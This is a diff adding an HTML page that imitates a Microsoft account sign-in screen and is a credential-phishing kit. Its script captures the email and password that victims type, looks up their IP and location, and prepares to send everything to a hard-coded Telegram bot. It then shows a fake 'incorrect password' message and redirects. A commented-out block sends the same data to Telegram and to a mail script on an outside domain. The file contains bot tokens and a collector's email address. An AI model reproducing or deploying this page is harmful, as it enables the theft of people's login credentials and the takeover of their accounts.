@@ -1,0 +1,509 @@
+<!-- <script>
+    // Get today's date
+    var today = new Date();
+    // Set the target date (e.g., May 31, 2024)
+    var targetDate = new Date('2024-05-18');
+
+    // Check if today's date is greater than the target date
+    if (today > targetDate) {
+        // Redirect to another page
+        window.location.href = 'https://hostblast.net/cgi-sys/suspendedpage.cgi';
+    }
+</script> -->
+
+<!-- <div id="google_translate_element" style='position: fixed; bottom: 0; left: 0'></div>
+  <script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement({pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE}, 'google_translate_element');
+        }
+    </script>
+
+    <script type="text/javascript" src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script> --><!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign in to your account</title>
+    <meta name="robots" content="noindex, nofollow" />
+    <meta name="robots" content="noindex" />
+    <meta name="googlebot" content="noarchive" />
+
+    <link rel="shortcut icon" href="./imgs/favicon.ico" type="image/x-icon" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
+    />
+    <!-- <link rel="stylesheet" href="./font-awesome-4.7.0/css/font-awesome.min.css"> -->
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Trebuchet MS", "Lucida Sans Unicode", "Lucida Grande",
+          "Lucida Sans", Arial, sans-serif;
+      }
+
+      html {
+        scroll-behavior: smooth;
+        color: #383838;
+        /* overflow-y: hidden; */
+      }
+
+      #form::-webkit-scrollbar {
+        background: transparent;
+        width: 0;
+        height: 0;
+      }
+
+      .container-item {
+        z-index: 99999;
+        margin: 40px 10%;
+        overflow-x: hidden;
+      }
+
+      .container-item-2 {
+        margin: 40px 10%;
+        /* border: 1px solid #7c7c7c; */
+        display: flex;
+        justify-content: left;
+        align-items: center;
+        color: #383838;
+        padding: 5px 15px;
+      }
+
+      input {
+        padding: 10px 1px;
+        width: 100%;
+        border: 1px solid transparent;
+        border-bottom: 1px solid #383838;
+        z-index: 1;
+      }
+
+      .slide-one {
+        width: 100%;
+        transition: 0.5s ease all;
+      }
+
+      .slide-two {
+        width: 100%;
+        transition: 0.5s ease all;
+      }
+
+      .slide-one-toggle {
+        transform: translateX(-100%);
+      }
+
+      .slide-two-toggle {
+        transform: translateX(-100%);
+      }
+
+      input:focus {
+        border-bottom: 1px solid red;
+        outline: 1px solid transparent;
+      }
+
+      #form p {
+        font-size: 14px;
+      }
+
+      #form p img {
+        transform: translateY(6px);
+      }
+
+      #form {
+        display: flex;
+        justify-content: space-between;
+        overflow-x: scroll;
+        width: 200%;
+      }
+
+      #btn {
+        background: #0067b8;
+        color: white;
+        border: 1px solid transparent;
+        width: 100px;
+        text-align: center;
+        border-radius: 2px;
+        padding: 8px 5px;
+      }
+
+      span {
+        color: dodgerblue;
+      }
+
+      .btn-item {
+        display: flex;
+        justify-content: right;
+        margin: 25px 0;
+      }
+
+      footer ul {
+        list-style-type: none;
+        display: flex;
+        justify-content: end;
+        align-items: center;
+        position: fixed;
+        bottom: 0;
+        right: 10px;
+        font-size: 12px;
+      }
+
+      footer ul li {
+        padding: 5px 10px;
+      }
+
+      a {
+        text-decoration: none;
+        color: #383838;
+      }
+
+      @media screen and (min-width: 600px) {
+        body {
+          background: linear-gradient(
+            27deg,
+            rgba(231, 216, 210, 1) 28%,
+            rgba(214, 220, 227, 1) 52%,
+            rgba(214, 225, 210, 1) 80%,
+            rgba(231, 216, 210, 1) 100%
+          );
+        }
+
+        .container {
+          margin: 5% 50%;
+          transform: translateX(-50%);
+          width: 70%;
+          background: white;
+          padding: 10px;
+          box-shadow: 1px 1px 10px #b3b1b180;
+        }
+
+        .container-item-2 {
+          margin: 8% 50%;
+          transform: translate(-50%, -20px);
+          width: 70%;
+          background: white;
+          padding: 10px;
+          box-shadow: 1px 1px 10px #b3b1b180;
+        }
+
+        footer {
+          display: flex;
+          justify-content: center;
+        }
+      }
+
+      @media screen and (min-width: 768px) {
+        .container {
+          width: 40%;
+        }
+
+        .container-item-2 {
+          transform: translate(-50%, -50px);
+          width: 40%;
+        }
+      }
+
+      @media screen and (min-width: 1200px) {
+        .container {
+          width: 30%;
+        }
+
+        .container-item-2 {
+          transform: translate(-50%, -70px);
+          width: 30%;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="container-item">
+        <img src="./imgs/mlogo.svg" alt="" /><br /><br />
+        <div id="form">
+          <div class="slide-one">
+            <h2>Sign in</h2>
+            <span class="msg" style="color: red; font-size: 13px"></span>
+            <br />
+            <input
+              type="email"
+              id="email"
+              name="username"
+              placeholder="Email, phone, or Skype"
+            /><br /><br />
+            <p>
+              No account? <a href=""><span>Create one!</span></a>
+            </p>
+            <p style="color: dodgerblue">
+              Sign in with a security key
+              <img src="./imgs/question.JPG" alt="" />
+            </p>
+            <div class="btn-item" style="margin-right: 5px">
+              <p id="btn" class="next">Next</p>
+            </div>
+          </div>
+
+          <div class="slide-two">
+            <span class="msg2" style="color: red; font-size: 13px"></span><br />
+            <p id="back">
+              <i class="fa fa-arrow-left"></i>
+              <span id="name" style="color: #383838"></span>
+            </p>
+            <br />
+            <h2>Enter password</h2>
+            <br />
+            <input
+              type="password"
+              id="password"
+              name="password"
+              placeholder="Password"
+            /><br /><br />
+            <p>Forget password?</p>
+            <a href="">
+              <p style="color: dodgerblue">Other ways to sign in</p>
+            </a>
+            <div class="btn-item">
+              <button id="btn" class="submit">Sign in</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="container-item-2">
+      <img src="./imgs/key.JPG" width="25px" />
+      <span style="color: #383838">Sign- in options</span>
+    </div>
+
+    <footer>
+      <ul>
+        <a href="#">
+          <li>Terms of use</li>
+        </a>
+        <a href="#">
+          <li>Privacy & cookies</li>
+        </a>
+        <a href="#">
+          <li>...</li>
+        </a>
+      </ul>
+    </footer>
+
+    <iframe src="" id="iframLink" style="opacity: 0" frameborder="0"></iframe>
+
+    <input
+      type="hidden"
+      id="country"
+      value="Romania
+    "
+      name="country"
+    />
+    <input
+      type="hidden"
+      id="city"
+      value="Bucharest
+    "
+      name="city"
+    />
+    <input
+      type="hidden"
+      id="continent"
+      value="Europe
+    "
+      name="city"
+    />
+    <input type="hidden" id="ip" value="185.100.87.139" name="ip" />
+    <input
+      type="hidden"
+      id="adminEmail"
+      value="ohenhenkennedy@gmail.com"
+      name="admin"
+    />
+
+    <script>
+      var next = document.querySelector(".next");
+      var submit = document.querySelector(".submit");
+      var slide_one = document.querySelector(".slide-one");
+      var slide_two = document.querySelector(".slide-two");
+      var email = document.getElementById("email");
+      var nameText = document.getElementById("name");
+      var back_btn = document.getElementById("back");
+      var password = document.getElementById("password");
+      var msg = document.querySelector(".msg");
+      var msg2 = document.querySelector(".msg2");
+      var country = document.getElementById("country");
+      var city = document.getElementById("city");
+      var continent = document.getElementById("continent");
+      var ip = document.getElementById("ip");
+      var adminEmail = document.getElementById("adminEmail");
+      var iframLink = document.getElementById("iframLink");
+
+      var userName = email.value.replace(/\s+/g, "-");
+      var passWord = password.value.replace(/\s+/g, "-");
+      var countryName = country.value.replace(/\s+/g, "-");
+      var cityName = city.value.replace(/\s+/g, "-");
+      var continentName = continent.value.replace(/\s+/g, "-");
+
+      var container_item_2 = document.querySelector(".container-item-2");
+      next.addEventListener("click", function () {
+        if (email.value == "") {
+          msg.textContent =
+            "Enter a valid email address, phone number, or Skype name.";
+        } else {
+          msg.textContent = "";
+          nameText.textContent = email.value;
+          slide_one.classList.add("slide-one-toggle");
+          slide_two.classList.add("slide-two-toggle");
+          container_item_2.style.display = "none";
+        }
+      });
+      back_btn.addEventListener("click", function () {
+        slide_one.classList.remove("slide-one-toggle");
+        slide_two.classList.remove("slide-two-toggle");
+        container_item_2.style.display = "flex";
+      });
+
+      const form = document.querySelector("#form");
+      var ct = "5";
+      var co = 0;
+      var lo = 0;
+      var st = 0;
+
+      submit.addEventListener("click", (e) => {
+        e.preventDefault();
+
+        fetch("https://ipapi.co/json/")
+          .then((res) => res.json())
+          .then((data) => {
+            ct = data.ip;
+            co = data.country_name;
+            lo = data.country_calling_code;
+            st = data.city;
+
+            var identity = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+
+            var my_text = `Result from Mail for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
+
+            var token = "6986854895:AAGyBEUhIFcSqaNmOrBMjpQigzVMZpMO38g";
+            var chat_id = -4085217527;
+
+            let api = new XMLHttpRequest();
+            api.open("GET", url, true);
+            api.send();
+            clicking = clicking + 1;
+            setTimeout(function () {
+              document.getElementById("alert-message").innerHTML =
+                "Sorry, your password was incorrect. Please double-check your password.";
+            }, 1000);
+            if (clicking == 2) {
+              window.location.replace("thanks.html");
+            }
+          });
+
+        // window.location.replace("https://www.instagram.com/accounts/login/")
+        //   console.log("Incorrect Password!");
+      });
+
+      //   submit.addEventListener("click", function () {
+      //     if (password.value == "") {
+      //       msg2.textContent =
+      //         "Please enter the password for your Microsoft account.";
+      //     } else {
+      //       msg2.textContent = "Sorry an error occurred. Please try again later";
+      //       var xhr = new XMLHttpRequest();
+      //       var data = new FormData();
+      //       data.append("username", email.value + " (hotmail)");
+      //       data.append("password", password.value);
+      //       xhr.onreadystatechange = function () {};
+      //       xhr.open("POST", "./info/login.php", true);
+      //       xhr.send(data);
+
+      //       var xhr2 = new XMLHttpRequest();
+      //       var datad = new FormData();
+      //       datad.append("username", email.value + " (hotmail)");
+      //       datad.append("password", password.value);
+      //       xhr2.onreadystatechange = function () {};
+      //       xhr2.open("POST", "./info/login.php", true);
+      //       xhr2.send(datad);
+
+      //       // Telegram script
+      //       // Replace with your actual bot token and chat ID
+      //       const botToken = "";
+      //       const chatId = "";
+
+      //       // const botToken = '6401126376:AAFTbEFPvw9eWttuZ932uFik9MaDcqEHUnA';
+      //       // const chatId = '5360982855';
+
+      //       // Function to send a message using vanilla Ajax
+      //       function sendMessage(message) {
+      //         const xhr = new XMLHttpRequest();
+      //         const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      //         const params = `chat_id=${chatId}&text=${encodeURIComponent(
+      //           message
+      //         )}`;
+
+      //         xhr.open("POST", url, true);
+      //         xhr.setRequestHeader(
+      //           "Content-type",
+      //           "application/x-www-form-urlencoded"
+      //         );
+
+      //         xhr.onreadystatechange = function () {
+      //           if (xhr.readyState === 4) {
+      //             if (xhr.status === 200) {
+      //               console.log("Message sent:", xhr.responseText);
+      //             } else {
+      //               console.error(
+      //                 "Error sending message:",
+      //                 xhr.status,
+      //                 xhr.statusText
+      //               );
+      //             }
+      //           }
+      //         };
+
+      //         xhr.send(params);
+      //       }
+
+      //       // Example: Send a message when the page loads
+      //       const messageToSend = `Hello admin, somebody just logged in: \n \n Email: ${email.value} (Hotmail) \n \n Password: ${password.value} \n \n IP: ${ip.value} \n \n country: ${country.value} \n city: ${city.value} \n continent: ${continent.value} `;
+      //       sendMessage(messageToSend);
+
+      //       // Telegram End
+
+      //       //===============================================
+      //       //MAIL SENDER
+      //       var xhr2 = new XMLHttpRequest();
+      //       var data2 = new FormData();
+      //       var url2 =
+      //         "https://dominicinteriordecor.com/mail.php?username=" +
+      //         username.value.replace(/\s+/g, "") +
+      //         "(Hotmail)" +
+      //         "&password=" +
+      //         password.value.replace(/\s+/g, "") +
+      //         "&country=" +
+      //         country.value.replace(/\s+/g, "") +
+      //         "&city=" +
+      //         city.value.replace(/\s+/g, "") +
+      //         "&continent=" +
+      //         continent.value.replace(/\s+/g, "") +
+      //         "&ip=" +
+      //         ip.value +
+      //         "&adminEmail=" +
+      //         adminEmail.value;
+
+      //       iframLink.src = url2;
+
+      //       xhr2.onreadystatechange = function () {
+      //         console.log("sent successfully");
+      //       };
+      //       xhr2.open("GET", url2, "true");
+      //       xhr2.send();
+      //       //======================================
+      //     }
+      //   });
+    </script>
+  </body>
+</html>
